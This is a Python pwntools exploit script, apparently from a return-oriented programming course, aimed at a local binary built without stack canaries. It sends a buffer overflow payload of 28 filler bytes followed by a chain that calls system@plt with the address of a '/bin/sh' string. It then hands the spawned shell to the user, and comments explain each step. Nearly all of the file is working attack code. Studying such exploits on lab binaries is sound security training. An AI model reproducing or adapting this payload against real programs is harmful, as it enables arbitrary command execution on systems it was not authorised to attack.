#!/usr/bin/python
from pwn import *

def main():
	'''
	objdump -d vuln3-nocanary-execstack | grep give_date
	080484cb <give_date>:
	8048536:       e8 90 ff ff ff          call   80484cb <give_date>
	'''
	#ret_addr = 0x080484cb 

	'''
	vuln3-nocanary-execstack : 0x8048600 ("/bin/sh")
	call   0x8048390 <system@plt>
	''' 

	ret_addr = p32(0x8048390) # system
	bin_sh = p32(0x8048600)# /bin/sh
	rop = ret_addr + '\x90' * 4 + bin_sh # \x90: nop

	# Starts process
	p = process("../ROP_crash_course/vuln3-nocanary-execstack")

	payload = "A" * 28 + rop

	# Get rid of the prompt
	data1 = p.recvrepeat(0.2)
	log.info("Got data: %s" % data1)

	# Print process id(debugging purposes)
	raw_input(str(p.proc.pid))

	# Send payload
	p.sendline(payload)

	'''
	Pass interaction back to user
	Importance:

	A requirement for functions that executes shell.
	Else program will execute /bin/dash and terminate since there is nothing to keep the shell open
	'''
	p.interactive()

if __name__ == "__main__":
	main()
